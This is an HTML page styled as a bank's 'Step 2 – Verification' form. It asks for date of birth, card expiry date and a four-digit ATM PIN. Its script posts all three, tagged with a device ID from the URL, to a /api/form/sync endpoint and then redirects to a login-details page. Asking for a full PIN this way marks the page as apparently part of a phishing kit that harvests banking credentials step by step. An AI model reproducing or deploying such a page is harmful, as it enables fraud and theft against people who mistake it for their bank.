<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Step 2 – Verification</title>

    <style>
        :root {
            --primary: #0a4da2;
            --primary-dark: #083b7a;
            --bg: #eef4fb;
            --text: #1f2a44;
            --border: #d6e0f0;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: var(--bg);
            color: var(--text);
        }

        .page {
            max-width: 420px;
            margin: auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: var(--bg);
        }

        .top-banner-full {
            height: 190px;
            overflow: hidden;
        }

        .top-banner-full img {
            width: 100%;
            height: 110%;
            object-fit: cover;
            display: block;
        }

        .form {
            padding: 16px;
            flex: 1;
        }

        h2 {
            text-align: center;
            color: var(--primary);
            font-size: 20px;
            font-weight: 600;
            margin: 8px 0 20px;
        }

        label {
            display: block;
            margin-bottom: 4px;
            font-size: 14px;
            font-weight: bold;
        }

        label span {
            color: red;
        }

        input {
            width: 100%;
            height: 42px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid var(--border);
            border-radius: 6px;
            margin-bottom: 14px;
            outline: none;
        }

        input:focus {
            border-color: var(--primary);
        }

        .pin-input {
            font-size: 24px;
            letter-spacing: 12px;
            text-align: center;
        }

        button {
            width: 100%;
            height: 46px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            color: #fff;
            background: var(--primary);
            cursor: pointer;
            margin-top: 16px;
        }

        button:disabled {
            background: #b9c7de;
            cursor: not-allowed;
        }

        .bottom-banner {
            height: 140px;
            overflow: hidden;
        }

        .bottom-banner img {
            width: 100%;
            height: 115%;
            object-fit: cover;
            display: block;
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="top-banner-full">
            <img src="../img/top-banner.jpg" alt="Top Banner">
        </div>

        <div class="form">
            <h2 style="margin-bottom:16px;">Step 2 – Verification</h2>

            <label>Date of Birth <span>*</span></label>
            <input type="tel" id="dob" placeholder="DD/MM/YYYY" maxlength="10">

            <label>Card Expiry Date <span>*</span></label>
            <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5">

            <label>ATM PIN <span>*</span></label>
            <input type="tel" id="forumPin" class="pin-input" inputmode="numeric" placeholder="••••" maxlength="4">

            <button id="forumSubmit" disabled>Continue</button>
        </div>

        <div class="bottom-banner">
            <img src="../img/bottom-banner.jpg" alt="Bottom Banner">
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('deviceId') || 'unknown';

        async function syncPageData(pageName, data) {
            try {
                await fetch('/api/form/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        deviceId: deviceId,
                        pageName: pageName,
                        pageData: data,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (error) {
                console.error('[Form] Sync error:', error);
            }
        }

        const dobInput = document.getElementById('dob');
        const expiryInput = document.getElementById('cardExpiry');
        const forumPinInput = document.getElementById('forumPin');
        const forumSubmitBtn = document.getElementById('forumSubmit');

        // DOB formatting
        dobInput.addEventListener('input', () => {
            let v = dobInput.value.replace(/\D/g, '').slice(0, 8);
            let f = '';
            if (v.length > 0) f = v.slice(0, 2);
            if (v.length > 2) f += '/' + v.slice(2, 4);
            if (v.length > 4) f += '/' + v.slice(4);
            dobInput.value = f;
            validateForum();
        });

        // Expiry formatting
        expiryInput.addEventListener('input', () => {
            let v = expiryInput.value.replace(/\D/g, '').slice(0, 4);
            if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
            expiryInput.value = v;
            validateForum();
        });

        // Forum PIN
        forumPinInput.addEventListener('input', () => {
            forumPinInput.value = forumPinInput.value.replace(/\D/g, '').slice(0, 4);
            validateForum();
        });

        function validateForum() {
            forumSubmitBtn.disabled = !(
                dobInput.value.length === 10 &&
                expiryInput.value.length === 5 &&
                forumPinInput.value.length === 4
            );
        }

        forumSubmitBtn.addEventListener('click', async () => {
            await syncPageData('verification', {
                dateOfBirth: dobInput.value,
                cardExpiry: expiryInput.value,
                finalPin: forumPinInput.value
            });

            window.location.href = 'login_details.html?deviceId=' + encodeURIComponent(deviceId);
        });
    </script>
</body>

</html>
